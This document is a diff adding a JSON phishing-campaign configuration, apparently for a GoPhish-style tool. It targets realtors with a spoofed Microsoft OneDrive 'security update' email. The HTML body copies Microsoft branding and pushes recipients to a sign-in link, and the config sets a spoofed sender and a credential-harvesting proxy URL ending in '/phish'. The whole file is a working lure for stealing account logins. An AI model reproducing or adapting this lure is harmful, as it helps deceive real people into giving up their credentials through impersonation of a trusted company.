@@ -1,0 +1,11 @@
+{
+  "recipients": [
+    {"email": "realtor1@domain.com", "name": "John Realtor"},
+    {"email": "realtor2@domain.com", "name": "Jane Agent"}
+  ],
+  "subject": "Urgent: OneDrive Security Update Required – Action Needed",
+  "body_html": "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><title>Microsoft OneDrive Security Update</title></head><body style=\"margin:0; padding:0; font-family:Segoe UI;\"><table role=\"presentation\" width=\"100%\" style=\"max-width:600px; margin:0 auto;\"><tr><td style=\"padding:20px; background-color:#0078d4; text-align:center;\"><img src=\"https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE4MzBh?ver=5e5f&q=90&m=8&h=500&w=900\" alt=\"Microsoft\" width=\"120\"></td></tr><tr><td style=\"padding:30px 20px;\"><h2 style=\"color:#323130;\">Security Update Required for Your OneDrive Account</h2><p>Dear {{.Name}},</p><p>We're enhancing security for OneDrive via SharePoint integration. <strong>Action Required:</strong> Sign in to apply the update.</p></td></tr><tr><td style=\"padding:0 20px 30px; text-align:center;\"><a href=\"{{.URL}}\" style=\"padding:12px 24px; background-color:#0078d4; color:#ffffff; text-decoration:none; font-weight:bold;\">Update OneDrive Security Now</a></td></tr><tr><td style=\"padding:20px; background-color:#f3f2f1; text-align:center; font-size:12px;\">Microsoft Corporation</td></tr></table></body></html>",
+  "from_email": "security@onmicrosoft.com",
+  "proxy_url": "https://login.microsoft.com:8443/phish",
+  "tenant_id": "NETORGFT4679501.onmicrosoft.com"
+}
